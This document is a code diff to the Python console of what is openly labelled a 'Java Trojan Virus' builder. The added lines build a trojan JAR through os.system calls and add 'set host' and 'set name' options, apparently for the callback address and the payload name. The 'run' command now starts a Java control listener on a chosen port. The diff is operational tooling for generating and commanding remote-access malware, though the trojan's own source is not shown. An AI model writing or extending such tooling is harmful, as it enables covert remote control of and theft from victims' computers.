@@ -40,7 +40,7 @@ def console(runpath: str, jre: str):
 
         if command == 'make':
             #os.system("cp "+runpath+"/../Module/program/java/trojan_virus/release/app.jar")
-            os.system("")
+            os.system("cd "+runpath+"/../Module/program/java/trojan_virus/release/make && "+runpath+"/../jre/bin/jar -cvfm "+op.name+".jar ../Trojan_virus.MF * && mv "+op.name+".jar ~/")
             print(" [INFO] Make Java Trojan Virus OK: "+os.environ['HOME']+"/"+op.name+".jar")
 
         if command.startswith("set port "):
@@ -52,11 +52,27 @@ def console(runpath: str, jre: str):
                 print("input error")
                 continue
 
+        if command.startswith("set host "):
+            try :
+                op.connect = str(command[9:len(command)])
+
+            except:
+                print("input error")
+                continue
+
+        if command.startswith("set name "):
+            try :
+                op.name = str(command[9:len(command)])
+
+            except:
+                print("input error")
+                continue
+
         if command == 'show options':
             show_options()
 
         if command == 'run':
-            os.system("python3 "+runpath+"/../Module/program/python/trojan_virus/control.py "+str(op.port))
+            os.system(jre+" -jar "+runpath+"/../Module/program/java/trojan_virus/release/Control.jar "+str(op.port))
             continue
             
         if command == 'exit':
